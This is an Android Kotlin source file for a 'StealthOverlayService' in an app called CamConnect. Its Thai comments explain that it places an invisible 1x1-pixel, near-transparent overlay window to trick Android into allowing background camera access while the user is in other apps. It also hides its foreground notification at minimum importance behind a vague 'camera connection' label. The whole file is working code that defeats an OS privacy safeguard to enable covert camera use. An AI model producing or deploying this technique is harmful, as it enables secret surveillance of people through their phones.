package com.camconnect.camera_app

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Context
import android.content.Intent
import android.graphics.Color
import android.graphics.PixelFormat
import android.os.Build
import android.os.IBinder
import android.util.Log
import android.view.Gravity
import android.view.View
import android.view.WindowManager
import androidx.core.app.NotificationCompat

/**
 * Stealth Overlay Service — เทคนิค AirDroid Kids
 *
 * สร้าง overlay window ขนาด 1×1 pixel + alpha 0.01 (มองไม่เห็น) เพื่อ:
 * - หลอก Android ว่า "app มี window visible to user"
 * - ทำให้กล้องเข้าถึงได้แม้ user ใช้ app อื่นอยู่ (Android 10+ จำกัดเรื่องนี้)
 *
 * เป็น Foreground Service เพื่อรอด task removal + ตัว overlay เองทำงาน
 *
 * Requires: SYSTEM_ALERT_WINDOW permission (user ต้อง grant manual ผ่าน Settings)
 */
class StealthOverlayService : Service() {

    private var windowManager: WindowManager? = null
    private var overlayView: View? = null

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onCreate() {
        super.onCreate()
        windowManager = getSystemService(Context.WINDOW_SERVICE) as WindowManager
        startAsForeground()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        when (intent?.action) {
            ACTION_STOP -> {
                hideOverlay()
                stopSelf()
                return START_NOT_STICKY
            }
            else -> showOverlay()
        }
        return START_STICKY
    }

    private fun showOverlay() {
        if (overlayView != null) {
            Log.i(TAG, "Overlay already showing")
            return
        }
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M &&
            !android.provider.Settings.canDrawOverlays(this)
        ) {
            Log.w(TAG, "SYSTEM_ALERT_WINDOW not granted — cannot show overlay")
            return
        }

        val type = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY
        } else {
            @Suppress("DEPRECATION")
            WindowManager.LayoutParams.TYPE_PHONE
        }

        // Production mode: 1×1 px + alpha 0.01 + transparent → มองไม่เห็น
        // หลอกระบบว่า app มี window visible → camera access ใน background ได้
        val params = WindowManager.LayoutParams(
            1,
            1,
            type,
            WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE or
                WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or
                WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN or
                WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS,
            PixelFormat.TRANSLUCENT,
        ).apply {
            // มุมขวาบน — ตำแหน่งไม่สำคัญเพราะ 1×1 มองไม่เห็น
            gravity = Gravity.TOP or Gravity.END
            x = 0
            y = 0
            alpha = 0.01f // เกือบ 0 — มองไม่เห็น แต่ระบบยังนับว่ามี window
        }

        val view = View(this).apply {
            setBackgroundColor(Color.TRANSPARENT)
        }
        overlayView = view

        try {
            windowManager?.addView(view, params)
            Log.i(TAG, "Stealth 1×1 overlay shown")
        } catch (e: Exception) {
            Log.e(TAG, "addView failed: ${e.message}")
            overlayView = null
        }
    }

    private fun hideOverlay() {
        overlayView?.let {
            try { windowManager?.removeView(it) } catch (e: Exception) {
                Log.w(TAG, "removeView: ${e.message}")
            }
        }
        overlayView = null
        Log.i(TAG, "Stealth overlay hidden")
    }

    override fun onDestroy() {
        hideOverlay()
        super.onDestroy()
    }

    private fun startAsForeground() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val nm = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
            if (nm.getNotificationChannel(CHANNEL_ID) == null) {
                nm.createNotificationChannel(
                    NotificationChannel(
                        CHANNEL_ID,
                        "Stealth Overlay",
                        NotificationManager.IMPORTANCE_MIN, // เงียบสุด
                    ).apply {
                        setShowBadge(false)
                    },
                )
            }
        }
        val notif = NotificationCompat.Builder(this, CHANNEL_ID)
            .setSmallIcon(android.R.drawable.ic_dialog_info)
            .setContentTitle("CamConnect background")
            .setContentText("รักษาการเชื่อมต่อกล้อง")
            .setOngoing(true)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .build()
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
            startForeground(
                NOTIFICATION_ID,
                notif,
                android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_SPECIAL_USE,
            )
        } else {
            startForeground(NOTIFICATION_ID, notif)
        }
    }

    companion object {
        private const val TAG = "StealthOverlay"
        private const val CHANNEL_ID = "camconnect_stealth"
        private const val NOTIFICATION_ID = 7001

        const val ACTION_STOP = "com.camconnect.camera_app.STEALTH_STOP"

        fun start(context: Context) {
            val intent = Intent(context, StealthOverlayService::class.java)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                context.startForegroundService(intent)
            } else {
                context.startService(intent)
            }
        }

        fun stop(context: Context) {
            val intent = Intent(context, StealthOverlayService::class.java).apply {
                action = ACTION_STOP
            }
            context.startService(intent)
        }
    }
}
